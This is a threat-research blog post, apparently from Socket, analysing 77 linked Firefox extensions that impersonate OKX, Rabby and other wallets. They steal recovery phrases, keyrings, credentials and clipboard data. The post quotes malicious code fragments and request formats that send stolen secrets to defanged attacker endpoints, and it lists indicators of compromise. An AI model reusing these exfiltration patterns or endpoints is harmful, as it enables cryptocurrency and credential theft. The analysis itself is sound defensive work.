---
title: "77 Firefox Extensions Linked to Crypto Wallet and Credential Theft"
short_title: "Firefox Extensions Linked to Wallet Theft"
date: 2026-08-19 12:00:00 +0000
categories: [Malware, Browser Extensions]
tags: [Firefox, Extensions, OKX, Rabby, Supabase, Cloudflare, API-Sports, Infostealer, Clipboard, Cryptocurrency, Offside Wallet Theft Factory, T1176.001, T1204, T1059.007, T1036.005, T1056.002, T1005, T1115, T1102.001, T1071.001, T1020, T1030, T1041]
canonical_url: https://socket.dev/blog/firefox-crypto-wallet-theft
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/242e6c8ab27819ec1feaa5a0244f5589c7be93a0-1672x940.png?w=1600&q=95&fit=max&auto=format
  alt: "77 Firefox Extensions Linked to Crypto Wallet and Credential Theft"
description: "Socket uncovered 77 linked Firefox extensions, including 40 that steal wallet secrets or credentials and 37 deceptive sports-score shells."
---

> _Socket identified 40 malicious extensions that steal wallet secrets or credentials, plus 37 deceptive sports-score shells linked through shared code, infrastructure, publishing artifacts, and version histories._

The Socket Threat Research team is tracking 77 Firefox extension identities linked through code reuse, cloned extensions, deceptive marketplace descriptions, author-selected add-on ID patterns and domain-like suffixes, cryptocurrency-wallet impersonation, and version histories showing extension repurposing. Extension-level analysis confirms 40 as malicious. Another 37 form a coordinated multi-sport score-shell operation. Their analyzed builds contain no confirmed credential- or wallet-stealing payloads, but their deceptive functionality, shared publishing artifacts, and version histories indicate malicious intent.

The campaign has operated since at least March 2026 and continued into August. Mozilla signing records for the original 59 analyzed versions span March 9 to August 3, with activity peaking in April and late July. Our investigation through mid-August identified 18 additional campaign-linked extension identities, expanding the tracked set to 77, with several extensions still live when we reported them.

The malicious extensions impersonate OKX, Rabby Wallet, TronLink, and other Web3 products. Seven use threat actor-controlled Supabase projects as remote switches for phishing content. 15 capture recovery phrases, private keys, or other wallet secrets and exfiltrate them through Cloudflare Workers. 13 modified Rabby Wallet builds exfiltrate serialized keyrings before local encryption, while five additional extensions steal credentials and clipboard data through hardcoded command and control (C2) infrastructure.

Analysis of a 77-extension corpus within the broader investigation reveals the operation's publishing model. 37 extensions contain deceptive sports-score implementations spanning football, basketball, NBA, and hockey, sharing a hardcoded credential for legitimate API-Sports services while advertising unrelated functions such as password generation, dark mode, VPN access, currency conversion, screenshot capture, and note taking. Historical versions of nine confirmed malicious identities also used sports-score shells spanning football, basketball, NBA, and American football before later versions under the same Firefox IDs were repurposed into wallet-stealing extensions. The other 31 confirmed malicious identities lack the sports API integration but contain confirmed malicious wallet- or credential-stealing functionality.

We are provisionally tracking this campaign as "Offside Wallet Theft Factory", reflecting both the sports-score shells that helped expose the broader ecosystem and its factory-like production of cloned extensions designed to steal cryptocurrency wallet secrets. Shared code, infrastructure, campaign tokens, repeated add-on ID patterns, domain-like suffixes, clustered signing activity, misleading metadata, and direct version histories showing stable Firefox IDs transition from shell or utility builds into wallet malware indicate a common publishing pipeline or closely related threat actors. Attribution remains under investigation, and the available evidence does not establish that a single threat actor controls every extension.

We reported extensions that remained live during the investigation to Mozilla's security team. We appreciate the vigilance and responsiveness of Mozilla's Add-ons Operations team as threat actors continue adapting their methods to evade detection. Even short-lived cryptocurrency wallet extensions can cause immediate and irreversible financial harm once victims expose recovery phrases or private keys. Our Firefox ecosystem coverage complements Mozilla's [protections](https://blog.mozilla.org/addons/2025/05/30/crypto-wallet-scams-thwarting-a-new-threat/) by identifying related extensions, infrastructure, code reuse, version repurposing, and publishing patterns across the broader campaign.

![](https://cdn.sanity.io/images/cgdhsj6q/production/04be6b20f13135f3c945289a392bdb5344e8e72d-2048x1117.png?w=1600&q=95&fit=max&auto=format)
_Representative attack flow for the confirmed malicious extensions. Threat actors capture wallet secrets through remotely delivered phishing interfaces or code embedded directly in the extension, enabling wallet takeover and cryptocurrency theft._

## Supabase-Controlled Firefox Extensions Deliver Wallet-Phishing Pages

Our investigation begins with `0KX WEB3`, a Firefox extension that presents itself as an OKX cryptocurrency wallet but contains no wallet functionality.

Its Firefox Add-ons listing used `OKX`-style branding and screenshots, described the extension as a universal Web3 wallet, and claimed that it collected no data. The name substitutes a zero for the letter "O" in `OKX`, helping it resemble the legitimate product. At the time of review, the listing identified the publisher only as `dev` and showed seven users.

![](https://cdn.sanity.io/images/cgdhsj6q/production/3a7fb23fc94d7db1db0cfa46dcef2f573de84526-2048x1590.png?w=1600&q=95&fit=max&auto=format)
_The 0KX WEB3 listing was live during our analysis and presented the extension as a cryptocurrency wallet for managing assets, connecting to Web3 applications, and swapping tokens. Mozilla's security team removed the extension before publication._

The packaged extension contains no code for creating wallets, managing keys, signing transactions, connecting to blockchain providers, displaying balances, or transferring cryptocurrency. Instead, it combines:

1. A functional local notepad used as cover.
2. A hardcoded Supabase project URL and anonymous API key.
3. A remotely configurable URL loader.
4. Logic that loads the supplied URL in the extension popup and opens it separately after installation or update.

`0KX WEB3` is therefore better classified as a remote-controlled phishing delivery extension than a conventional infostealer.

## From Installation to Wallet Compromise

Whenever a victim opens the extension, it queries the `public_notes` table in its embedded Supabase project and retrieves the latest `content` value. Supabase is a legitimate cloud platform; the threat actors abuse a specific project as a remote controller.

During analysis, the record points to `hxxps://portal-web3-extension-welcome[.]pages[.]dev/home`.

The extension loads this URL inside its popup and also opens it in a separate window after installation or update. The destination, hosted through the legitimate Cloudflare Pages service, presents a polished Web3 interface with `Create wallet` and `Import wallet` options.

![](https://cdn.sanity.io/images/cgdhsj6q/production/873640fa90994d9c42b9b5fa64efa3ab40e143aa-2048x1717.png?w=1600&q=95&fit=max&auto=format)
_The remote page loaded by 0KX WEB3 presents a Web3 wallet interface and directs users toward wallet creation or import workflows._

The import workflow requests a recovery phrase or private key, including recovery phrases of up to 24 words. A victim who submits either secret gives the threat actors everything needed to restore the wallet elsewhere and transfer its assets.

The extension does not search for wallets or extract stored credentials. Instead, it relies on victims to enter secrets into the remote interface. It requests only `storage` and `tabs`, illustrating why low permission requirements do not necessarily mean low risk.

## Remote Activation and Benign-Looking Cover

The core logic implements a remote-content switch. Where necessary, we added inline comments to clarify malicious functionality and intent; all threat actor-controlled infrastructure has been defanged.

```javascript
const { data } = await supabase
  .from("public_notes") // Query the threat actor-controlled table
  .select("content")    // Retrieve the configured value
  .order("created_at", { ascending: false }) // Use the latest record
  .limit(1)
  .single();

if (data?.content?.startsWith("http")) {
  webIframe.src = data.content; // Load the phishing page
} else {
  showLocalVault();             // Display the decoy notepad
}
```

When active, the remote URL loads in an iframe without a `sandbox` attribute; otherwise, the extension falls back to the local notepad. By changing a single Supabase value, the threat actor can switch between benign and phishing content without modifying or republishing the extension. The source labels these states "OFF MODE" and "ON MODE". The same controller is checked after installation or update, when a returned URL opens in a separate popup window.

The extension requests only `storage` and `tabs`. It does not require access to cookies, browsing history, stored credentials, or all visited websites. This highlights a limitation of permission-based risk scoring: an extension needs few privileges when its purpose is to display a remote page and persuade the victim to surrender secrets.

Its no-data-collection declaration is also misleading in practice. Although the packaged code does not directly transmit wallet credentials, the extension-delivered phishing page solicits them.

## One Loader Template, Seven Extensions

The same remote-loader architecture appears across seven confirmed malicious Firefox extensions. Six variants contain byte-identical copies of `background.js`, `popup.js`, `popup.html`, and the bundled Supabase client. Their main differences are the extension identity, branding, and embedded Supabase configuration. `ExtensionApp` uses a closely related version of the same architecture, including the `public_notes` query, `quickVaultNote` decoy, remote iframe loading, and install-time popup behavior.

One of the additional variants, `Rabbit For Desktop` (`{d8a5f7c3-9e4b-2f2a-b1d7-8c7e9f4a2b7c}`), uses the same loader template while pointing to a separate Supabase project at `hxxps://vgksucdjccsojzuhckzk[.]supabase[.]co`. Despite its wallet-themed name, the package contains the same notepad cover and remotely controlled content-loading architecture rather than wallet functionality.

Separate Supabase projects give the threat actor independent control over each variant. One extension can remain dormant while another serves active phishing content, and each destination can change without updating the extension.

## Firefox Extensions Use Cloudflare Workers to Steal Wallet Secrets

Unlike the Supabase-controlled loaders, the next cluster embeds the wallet interface and theft logic directly in the signed Firefox package. The 15 extensions send stolen recovery phrases or private keys to threat actor-controlled Cloudflare Worker deployments.

Cloudflare Workers is a legitimate serverless platform. The malicious components are the specific Worker deployments used to receive stolen wallet data.

## Modified Rabby Code Intercepts Recovery Phrases

Several variants hide modified Rabby wallet code behind unrelated names such as `Sady-Theme - Browser Extension`, `Safe-Theme - Browser Extension`, and `School-Theme - Browser Extension`.

Five extensions, including four theme-branded variants and `RABB-WALLEТ - Browser Extension` (`silver-fox@browser-app.com`), contain the same executable code apart from their manifests and Mozilla signing files. Their malicious implant resides in the wallet bundle [`977.js`](https://socket.dev/firefox/package/chiro-di-red@tools.com/files/8.12.13/977.js), where it captures newly generated or imported 12-word or 24-word recovery phrases and sends them to `hxxps://dry-bush-5408[.]animalrescueeducationcenter-org[.]workers[.]dev/`.

A representative request includes the shared campaign token `EQOx7EIPZSNi` and places the recovery phrase in the `w` parameter: `?a=login&s=EQOx7EIPZSNi&k=login&w=<recovery_phrase>`.

Two additional Rabby-derived variants use the same theft model. `℞ab␢y Wa❘Iet` sends recovery phrases to a separate Worker deployment, while `tab-W - Browser Extension` reuses the `dry-bush-5408` endpoint.

The theft occurs during normal wallet creation or import. Much of the underlying Rabby code remains functional, allowing the wallet to behave as expected while silently disclosing its most sensitive secret.

A recovery phrase can regenerate the wallet's private keys on another device. Once exposed, removing the extension does not revoke it, and the threat actors can independently access and transfer the wallet's assets.

![](https://cdn.sanity.io/images/cgdhsj6q/production/6eb4ca8952093074744d539e6121690453a08bbd-2048x1186.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner flags the malicious [3ABBY- Browser Extension](https://socket.dev/firefox/package/chiro-di-red@tools.com/overview/8.12.13) and surfaces its broad browser and wildcard host permissions. Our analysis identified modified Rabby-derived code that captures 12- or 24-word recovery phrases and exfiltrates them to threat actor-controlled Cloudflare Worker infrastructure._

## Counterfeit Wallets Collect Secrets Directly

Eight other extensions use counterfeit `Portal`, `OKX`, or generic Web3 interfaces instead of modifying Rabby's wallet-generation logic.

Six `Portal` and `Portal Web` variants guide victims through a wallet-import workflow and request a recovery phrase or private key. The phishing interface and exfiltration code are packaged inside the extension rather than loaded through Supabase. The variants use different Firefox IDs and display names but share the same background script and frontend components.

`Crypto & EVM` follows the same model and sends submitted wallet secrets to `hxxps://winter-smoke-a612[.]icy-star-f45c[.]workers[.]dev/`.

The homoglyph-based `OKX` impersonator `⭘K✖ WaIIet` presents another fake wallet-import interface and transmits the submitted secret through a `w1` parameter to `hxxps://winter-waterfall-0606[.]rihaniomar21[.]workers[.]dev/?w1=<wallet_secret>`.

These extensions do not need to locate an existing wallet or extract secrets from browser storage. They capture the recovery phrase or private key when the victim enters it into a convincing wallet workflow.

Across the 15 extensions, repeated wallet interfaces, byte-identical components, shared request structures, the `EQOx7EIPZSNi` campaign token, and overlapping Worker infrastructure provide multiple independent links between the variants.

## Modified Rabby Extensions Exfiltrate Wallet Keyrings Before Encryption

The next cluster targets Rabby's internal wallet-storage process. 13 Firefox extensions modify Rabby-derived code to exfiltrate serialized keyring data whenever the wallet persists its account state.

The variants use deceptive Rabby-style names, including `RABB-Walӏet Web3 & EVM`, `Rabb-Walӏet CryptoPortfolio`, and `Rabbit For Desktop`. Several replace letters with visually similar characters or slightly alter the product name to resemble the legitimate wallet.

## Theft Inside the Persistence Workflow

Rabby normally serializes its keyrings, encrypts the resulting data, and stores it locally. The malicious variants modify `persistAllKeyrings()` to send the serialized keyring array to a hardcoded HTTP endpoint before the legitimate encryption and storage logic runs.

A representative request follows this structure:

```javascript
POST hxxp://id[.]gemachriverdale[.]org:9000/hook/ptvve
Content-Type: application/json

{"ping": <serialized_keyring_array>}
```

The keyring data therefore leaves the device before Rabby encrypts it locally, and the variants transmit it over plain HTTP on port `9000`. Local encryption cannot protect data the implant has already exfiltrated.

The legitimate persistence workflow then continues, allowing the extension to retain expected wallet behavior. A victim can create or import accounts and continue using the wallet without seeing an obvious failure.

Package comparison across the 13 variants shows extensive reuse of the same Rabby-derived implementation. In eight variants, nearly the entire package is byte-identical to an existing malicious reference, with differences concentrated primarily in `background.js`, where the threat actor rotates the hardcoded exfiltration endpoint while preserving the same keyring-theft logic.

Each of the 13 variants places serialized keyring data in the same `ping` property but uses a different hardcoded collection endpoint, with distinct webhook paths across `gemachriverdale[.]org` and `e-wl[.]com` subdomains. The `e-wl[.]com` infrastructure spans multiple collection hosts while retaining the same plain-HTTP port `9000` and `/hook/` architecture.

The shared modification to `persistAllKeyrings()`, matching request structure, repeated Rabby-derived code, and parallel endpoint design link the 13 extensions to the same implementation family.

Historical versions provide an additional link to the broader publishing operation. Seven extension identities first appeared as basketball, NBA, or American-football score shells before later versions under the same Firefox IDs were repurposed into keyring-stealing wallet extensions. Another transitioned from a benign-looking utility into the same malicious wallet implementation.

This technique is less visible than a counterfeit wallet-import form. The victim does not need to submit secrets to an obviously suspicious page. The implant compromises sensitive wallet state during a routine internal operation while the surrounding wallet continues to function. Removing the extension stops further exfiltration but cannot recover data already transmitted.

## Five Firefox Extensions Steal Credentials and Clipboard Data

The next cluster broadens the campaign beyond wallet theft. Five Firefox extensions collect credentials and clipboard contents, then send the data to a hardcoded C2 server at `77[.]91[.]100[.]175`.

Four use the same `exrb` implementation, while `trl` uses closely related collection logic and the same C2 infrastructure. Unlike the phishing and modified-wallet clusters, these extensions do not depend on a fake wallet-import workflow. Their collection logic operates directly inside the installed extension.

## Credential and Clipboard Collection

The extensions submit captured credential data to `POST hxxp://77[.]91[.]100[.]175/html/app[.]php`.

They handle clipboard data separately. The code divides the captured content into numbered chunks and transmits them through `/html/continue.php` with parameters identifying the victim, current chunk, total number of chunks, and encoded data:

```javascript
GET hxxp://77[.]91[.]100[.]175/html/continue[.]php
    ?uid=<identifier>    // Associate chunks with the victim
    &part=<number>       // Identify the current chunk
    &total=<count>       // Record the expected chunk count
    &data=<encoded_data> // Transfer clipboard content
```

Chunking allows the server to reconstruct clipboard content that may exceed the practical size of a single request. Depending on the victim's activity, copied data could expose passwords, authentication material, cryptocurrency addresses, private keys, or other sensitive information.

Three identified extensions contain the same malicious `exrb` implementation as the original sample. Across all four `exrb` variants, every non-manifest, non-Mozilla-signing file is byte-identical. The variants retain the same credential collection, clipboard monitoring and chunking, C2 endpoints, and supporting code while changing the Firefox identity and wallet-themed display name.

`trl` also appeared under names including `TrooonLink`, `TrLink`, and `owjdbfjfoof`, illustrating the campaign's use of mutable display names around a stable extension identity.

![](https://cdn.sanity.io/images/cgdhsj6q/production/70f56742e340581247a67e69240fc5a0f48eef31-1128x1072.png?w=1600&q=95&fit=max&auto=format)

## Shared Development Artifacts

The five extensions share several code-level markers, including the [`collectMetrics`](https://socket.dev/firefox/package/%7Bf746f950-bd73-43de-bfe1-add342147853%7D/files/91.0.3/app.js#L20) function used in their credential-collection flows and the misspelled `apropriate` helper in `background.js`. The `trl` source additionally contains Russian-language instructional comments, including `как в ТЗ`, meaning "as specified in the technical requirements".

Historical versions also show identity repurposing. The `exrb` identity previously appeared as `Visited Link Marker`, while the other three `exrb` variants previously appeared as `Tab Muter`, `Kube Units`, and `Flow Pomodoros` before their later `711.0.1` builds adopted `Rabby`-style identities and the byte-identical malicious implementation. The `trl` identity likewise previously appeared as the unrelated utility `Radius Forge` before becoming `TrooonLink`.

All five extensions use the same hardcoded IP address, endpoint structure, collection model, and shared code artifacts. We therefore treat them as one implementation family. The four `exrb` variants provide direct code-level linkage because their executable contents are identical apart from manifest and Mozilla signing artifacts. Identity repurposing, wallet-themed rebranding, and surrounding publishing patterns also link this family to the broader Offside Wallet Theft Factory. We retain attribution caution, however, because the `exrb` and `trl` variants do not share the distinctive infrastructure or campaign tokens observed across the Supabase, Cloudflare Worker, and Rabby keyring clusters.

## 37 Deceptive Firefox Extensions Repackage Sports-Score Apps

The final cluster consists of 37 Firefox extension identities presented as unrelated utilities but actually running sports-score applications. 32 use the same live-football-score implementation, while five use basketball, NBA, or hockey data. Their analyzed builds contain no confirmed credential theft, wallet theft, clipboard collection, Supabase control, or other overtly malicious payload. We therefore classify the analyzed builds as suspicious and deceptive, while the surrounding campaign evidence and version histories indicate malicious intent.

The sports-shell model also appears in historical versions of several extensions classified elsewhere in this report as confirmed malicious. Under the same Firefox IDs, those extensions first distributed football, basketball, NBA, or American-football score applications before later versions replaced the sports functionality with wallet-stealing code. This version history links the deceptive shell operation directly to the broader publishing and weaponization pipeline.

Names such as `Quick Temp`, `Smart Pass`, `Smart Proxy`, `Dash Money`, `Smart Write`, `Proxy Scan`, `Forecast Tip`, and `Currency Hub` give little indication of their actual behavior. Despite advertising unrelated functions, the 32 football variants retrieve live football fixtures from API-Sports using the same implementation:

```javascript
fetch("https://v3.football.api-sports.io/fixtures?live=all", {
  headers: {
    "x-rapidapi-key": API_KEY, // Same embedded credential across all 32
    "x-rapidapi-host": "v3.football.api-sports.io"
  }
});
```

The five additional shells use the same embedded API credential while querying other API-Sports services, including `v1.basketball.api-sports.io`, `v2.nba.api-sports.io`, and `v1.hockey.api-sports.io`. API-Sports is a legitimate sports-data provider, and these endpoints are not malicious infrastructure. The suspicious behavior comes from the combination of deceptive identities, shared credentials, repeated implementation patterns, and extensive publishing overlap.

The original 32 football variants reuse the same hardcoded credential, byte-identical background and content scripts, and popup bundles. The additional basketball, NBA, and hockey shells preserve the same broader package model and credential reuse while adapting the score-fetching logic to different sports. In practice, extensions advertised as unrelated utilities are repackaged sports-score applications.

Their packaging follows the same repetitive pattern. Author-selected Firefox IDs such as `cool-page-nova@cleankits.co`, `dash-clip-clear@extlab.org`, `dash-map-fast@addonslab.com`, `easy-map-pixel@extlab.co`, and `quick-dash-pixel@extlab.example` reuse three-word structures and domain-like suffixes. Mozilla signing records and package artifacts further place the extensions within the same broader publishing activity.

Historical packages now show direct transitions from sports-score shells to confirmed wallet malware under the same Firefox IDs. Nine confirmed malicious identities have earlier versions that use the same API-Sports credential and score-shell model. These predecessors span football, basketball, NBA, and American football. Later versions replace the sports functionality with malicious wallet code while retaining the underlying Firefox identity.

For example, `deep-tip-sharp@browsify.co` appeared as the basketball-score shell `Quick Shield` before becoming a `Rabby`-style keyring stealer. `bolt-save-vault@devplugs.co` transitioned from the NBA-score shell `Lite Swatch`, while `gear-save-tip@extrakits.example` transitioned from the American-football shell `Timer Pulse`. Similar version histories appear across several other malicious identities.

The malicious homoglyph-based `OKX` impersonator `⭘K✖ WaIIet` provides another bridge. It uses the Firefox ID `live-football-scores@live-scores.com` while presenting a counterfeit cryptocurrency wallet and exfiltrating wallet secrets to a Cloudflare Worker.

The 37 analyzed shell builds do not contain confirmed credential- or wallet-stealing payloads, but we do not consider them benign. Their deceptive functionality, shared publishing artifacts, and version histories linking comparable sports-shell identities to later wallet-stealing builds indicate malicious intent and suggest the shells can serve as staging or precursor versions within the broader operation. API-Sports traffic alone is not sufficient for detection or attribution, however, and should be evaluated alongside the shared credential, implementation patterns, Firefox IDs, deceptive metadata, package artifacts, and version history.

## Outlook and Recommendations

A single successful installation can expose a recovery phrase, private key, or wallet state worth far more than the cost of repeatedly publishing disposable extensions. That economics helps explain the threat actors' persistence in targeting the Firefox Add-ons ecosystem even when individual extensions are short-lived and ultimately removed. Rotating names and IDs, repurposing existing extension identities, cloning code, and separating malicious functionality across extensions, remote pages, and cloud infrastructure make repeated publication cheap and scalable.

We expect the threat actors behind this campaign, and similar operators, to continue testing new ways to evade review. Future variants may rely more heavily on staged delivery, delayed activation, obfuscation, nested payloads, and functionality split across multiple components. The Supabase loaders already show how a signed package can remain relatively benign-looking while remote infrastructure supplies the phishing content later. Version histories in this campaign also show how an extension can begin as a sports-score shell or unrelated utility before a later update replaces that functionality with wallet-stealing code.

Defenders should not treat requested permissions as a proxy for trust. Some malicious extensions in this campaign required little or no user-approved privileged access because they relied on victims entering secrets into threat actor-controlled interfaces. Assessment should combine permissions with code similarity, remote-content behavior, version changes, extension IDs, infrastructure, signing history, and cross-package artifacts. Teams should also re-evaluate extensions after updates and treat exposed recovery phrases or private keys as permanently compromised, even after the extension is removed.

## Indicators of Compromise

### Confirmed Malicious Firefox Extensions

1. `bliss-heaven@webbrol.com` — Firefox ID `Safe-Themes - Browser Extension` — observed display name (Version: `8.12.13`) SHA-256: `08b7b064fa9a41b06774315d944ffddff705ab727222a0c3bcac64a77553bf2f`
2. `bold-page-vault@addonslab.example` — Firefox ID `Portal` — observed display name (Version: `7.9.17`) SHA-256: `4d0912d575087dab5f468214a2fd259bc386472a8b2b93b6e2441cde4bd941cb`
3. `bright-save-feed@tabtools.org` — Firefox ID `Rabbit For Desktop` — observed display name (Version: `8.20.10`) SHA-256: `26427220b9965e22deca0e617657c2c65b78f750183355d1265c147818367bd7`
4. `chiro-di-red@tools.com` — Firefox ID `Sady-Theme - Browser Extension` — observed display name (Version: `8.12.13`) SHA-256: `252119fc48ad93b0c930d7a62fb49420cf8986716539e4e9d4d5c1bad700d435`
5. `chiro-redok@webtools.com` — Firefox ID `Safe-Theme - Browser Extension` — observed display name (Version: `8.12.13`) SHA-256: `3c0f0413ca6326bd0107d532aec4daad7feec663d072f7c992682fb702b64cce`
6. `cool-block-gear@protools.com` — Firefox ID `tab-W - Browser Extension` — observed display name (Version: `8.12.10`) SHA-256: `31dc33e75aa2a9e64eac98467c5a516201e208d68ffe10d07800350ce1a44197`
7. `fast-akap-safe@browsertools.com` — Firefox ID `Portal` — observed display name (Version: `7.9.17`) SHA-256: `9c6f173418245a953d5fc3e9ec69f09b7aee8563127042a995ad172de9cdb88d`
8. `fast-map-safe@linktools.co` — Firefox ID `Portal` — observed display name (Version: `7.9.17`) SHA-256: `eeb1969d0c8b250976ec220f40236ddd7eb6863556379d17e1dd4078b5531751`
9. `flex-clock-dash@extrakits.com` — Firefox ID `℞ab␢y Wa❘Iet` — observed display name (Version: `2.4.9`) SHA-256: `6408b6a2c4000e74cde94d3ce31ada5e024d80782199e8010d6ef482686e687b`
10. `free-note-bolt@webtools.co` — Firefox ID `Rabb-Walӏet CryptoPortfolio` — observed display name (Version: `88.10.10`) SHA-256: `8590d1a22fdf42a363fe41fe6dc2cb03e616cc6d413f63d2ade9fd3ab54f1c83`
11. `green-fam-heav@browsertool.com` — Firefox ID `Portal Web` — observed display name (Version: `7.9.20`) SHA-256: `edcdbcdbea729fb11cbb0a353c3a9025e5a29de48fcd86e3948df738bf82b2aa`
12. `herman-rich@browsertools.com` — Firefox ID `Portal - Browser Extension` — observed display name (Version: `7.9.20`) SHA-256: `6a3c00936b7f62652eb4970b2bd3bb895fdd9ec1ebae1dab19f0c50cfbdc6b4c`
13. `live-football-scores@live-scores.com` — Firefox ID `⭘K✖ WaIIet` — observed display name (Version: `1.4.5`) SHA-256: `88d5b16c767e2527c14d2ae25dca6f4fe19f69517d0e00a2f26be055c575e3fe`
14. `park-static-small@devblogs.com` — Firefox ID `Portal Web` — observed display name (Version: `7.9.20`) SHA-256: `acf6f82916e78b2e5326fd16d6c97206532305cf5d68ea21e1a30537bffd26c0`
15. `peters-schools@webtoolbrowser.com` — Firefox ID `School-Theme - Browser Extension` — observed display name (Version: `8.12.13`) SHA-256: `547a878083e4e3c39c240f27e9caaa190ef04661f46468234987980d907d9834`
16. `safe-stat-pure@proaddons.net` — Firefox ID `RABB-Walӏet Web3 & EVM` — observed display name (Version: `9.70.20`) SHA-256: `8cec7990d4bc5e45034796fc63c63ba16781ac4303925ed1e80036668a9fe48e`
17. `sharp-stat-gear@netplugs.net` — Firefox ID `Rabbit/WALLET - EVM` — observed display name (Version: `9.10.10`) SHA-256: `46c40d3cefb10a9fd1dfeb03ff1dc550674d391bdf05c0294257809d51c254a8`
18. `swift-clip-link@fasttools.co` — Firefox ID `Web3 & EVM` — observed display name (Version: `9.50.10`) SHA-256: `aa9d8f30bd6e0633af5bb0fa16ed2e87fcd22e87725c48a5c96884465e262a28`
19. `vibe-timer-fast@extrakits.co` — Firefox ID `Crypto & EVM` — observed display name (Version: `7.22.4`) SHA-256: `5a7227dbf8e5c5c73f11c7df221c080252b337cb96b21f462d5ef17525f00f16`
20. `{91ac3e4f-1874-409d-b01f-aeb2409a23b8}` — Firefox ID `exrb` — observed display name (Version: `711.0.1`) SHA-256: `39827e214c31dbbf0ce20a40ee019cca2d96d621bf90dac4edc8b85a86311d09`
21. `{b1f3c8a9-4a2e-4b7c-9e1f-8a3d6c5b4e2f}` — Firefox ID `ExtensionApp` — observed display name (Version: `1.0`) SHA-256: `c7435c1659b6e0dc83487d03b3389ec22bb7e435c9b4c85a81f6c6504466060b`
22. `{d8a5f7c3-9e4b-2f2a-b1d7-8c7e9f4a2b3c}` — Firefox ID `SOL, ETH, BTC, and more` — observed display name (Version: `1.1.2`) SHA-256: `2b0d50aa0edf4f65e21b015fee169d68dc870a89d242836ccb3c7cef84db04c4`
23. `{d8a5f7c3-9e4b-4f2a-b1d6-8c7e9f3a2b2c}` — Firefox ID `Web3 Portal` — observed display name (Version: `1.0`) SHA-256: `71f74a903b12fdaa1cb7683599b7956602768f23934578171f6453fdee7b3eac`
24. `{d8a5f7c3-9e9b-2f8a-b1d6-8c1e9f4a2b7c}` — Firefox ID `ETH, BTC, SOL and more` — observed display name (Version: `1.1.1`) SHA-256: `3e4cd172c21c0c0d72c762fe84f07a9eb8f7c82f15add36bdf934ee42accf776`
25. `{d8a5f9c3-9e4b-4f2a-b1d7-8c7e9f4a2b3c}` — Firefox ID `0KX WEB3` — observed display name (Version: `1.0.0`) SHA-256: `918332da18e0f26378ee84408be13930da2d66cd80153cf18a5aa3d6d0cb2271`
26. `{d9a5f9c3-9e4b-2f3a-b2d7-8c8e9f4a2b3c}` — Firefox ID `BASE EVM&Web3` — observed display name (Version: `1.0.0`) SHA-256: `fd67f4a3c8993b1ce6aecf0cc8902e6a8535a6ef56c0bad42d7e936d0a17e060`
27. `{f746f950-bd73-43de-bfe1-add342147853}` — Firefox ID `trl` — observed display name (Version: `91.0.3`) Observed aliases: `TrooonLink`, `TrLink`, `owjdbfjfoof` SHA-256: `894398430972f91db2f1916f9fbe28b7319cb0e7d0e91a51e764fda5e7d1e8c9`
28. `bolt-save-vault@devplugs.co` — Firefox ID `🐇abby-WALLEТ - EVM&Web3 Manager` — observed display name (Version: `7.10.10`) SHA-256: `bee995e253092c8c8edfa4104799adbe40967596dfdb28a5668390aea40d0883`
29. `core-note-nova@webtools.net` — Firefox ID `RABB-Walleť EVM&Web3 Manager` — observed display name (Version: `8.22.30`) SHA-256: `66150abf5072f0d02118648d072afecdc8bac1d224dbc569836a65398d48e98d`
30. `deep-tip-sharp@browsify.co` — Firefox ID `Rby-WALLEТ - Crypto&Web3 Manager` — observed display name (Version: `6.7.10`) SHA-256: `46305296e0675147c7b4ceacc7d5e45dd44d5d2242c0c3e02b444931b3e1564b`
31. `fast-zip-true@smartext.co` — Firefox ID `RABB-WALLEТ EVM&Web3 Manager` — observed display name (Version: `10.20.10`) SHA-256: `e4c3a669362e8b456b1d6c8e6df7da2a9605a42d710d0cc951342b7ac0cb9d72`
32. `flex-lab-save@foxplugin.co` — Firefox ID `RabbWALLЕТ EVM&Web3 Manager` — observed display name (Versions: `7.10.30`, `8.10.30`) SHA-256 (`7.10.30`): `aeb6240b2f40a177999f68ae6fc88e511669d501aa298a433b05bafa89210685` SHA-256 (`8.10.30`): `172b7618498d1c9da6ff6aecc8f680d2b3956b7c86d80fbc060e0adae8f38ebf`
33. `gear-save-tip@extrakits.example` — Firefox ID `Rabbit WALLЕТ For Desktop` — observed display name (Version: `11.10.10`) SHA-256: `e335066fb09d0d9d0e5fd55b946d430071fb6f157bdb9b38e7f50714178a51eb`
34. `pure-net-snap@fasttools.co` — Firefox ID `Rabb🐇WALLЕТ EVM&Web3 Manager` — observed display name (Version: `9.11.30`) SHA-256: `61a19cab5c7bbcf5ded1c8b6a05d586ecbe03afc055c132049226f86f5127b3d`
35. `silver-fox@browser-app.com` — Firefox ID `RABB-WALLEТ - Browser Extension` — package manifest name (Version: `7.24.22`) `RABB-WALLEТ Web3 Extension` — observed alias SHA-256: `54d57acdd0557e22f9dd1350ac1bf1f536dd5859394b39cf9ba586b3d2339f05`
36. `smart-lab-glow@webkits.co` — Firefox ID `🐇abby-WALLEТ - Crypto&Web3 Manager` — observed display name (Version: `7.30.10`) SHA-256: `40f6611eacbcf10f6260f91caeb4a2223313f466340f3ea9d47d6e34ee8b889a`
37. `{64d210f4-9b7f-489f-8207-e042400041b7}` — Firefox ID `🐇abby-WALLEТ - Browser Extension` — observed display name (Version: `711.0.1`) Internal manifest name: `exrb` SHA-256: `6db5ea393b1618259fee5a2ca7467be47ea025255d2ab45a78b76e23e4e0b59e`
38. `{842fa1ed-b948-4bf8-b796-21044d3419eb}` — Firefox ID `Rab🐇y` — observed display name (Version: `711.0.1`) Internal manifest name: `exrb` SHA-256: `5c8121bd3394c4ea6d273a6936aeaa7d30aa748a978b440d7144819522813153`
39. `{b0043917-9d75-425b-977a-4bb553f2a8ee}` — Firefox ID `3abby - Browser Extension` — observed display name (Version: `711.0.1`) Internal manifest name: `exrb` SHA-256: `f0d262d1b1e446ee1a6db37b0301b9e2ab160269b193920212d55d7dfb231fe1`
40. `{d8a5f7c3-9e4b-2f2a-b1d7-8c7e9f4a2b7c}` — Firefox ID `Rabbit For Desktop` — observed display name (Version: `1.1.2`) SHA-256: `61659464d6ac002757b51c276f22cd3fff25089c1dc257c0b81309bf49aba7c0`

### Deceptive Sports-Score Shells Associated with Malicious Intent

1. `cool-page-nova@cleankits.co` — Firefox ID `Quick Temp` — observed display name (Version: `7.15.6`) SHA-256: `5dd33e0737e82b2e324dc4c04ce862da185153d54705697cfd0181e848bf35d4`
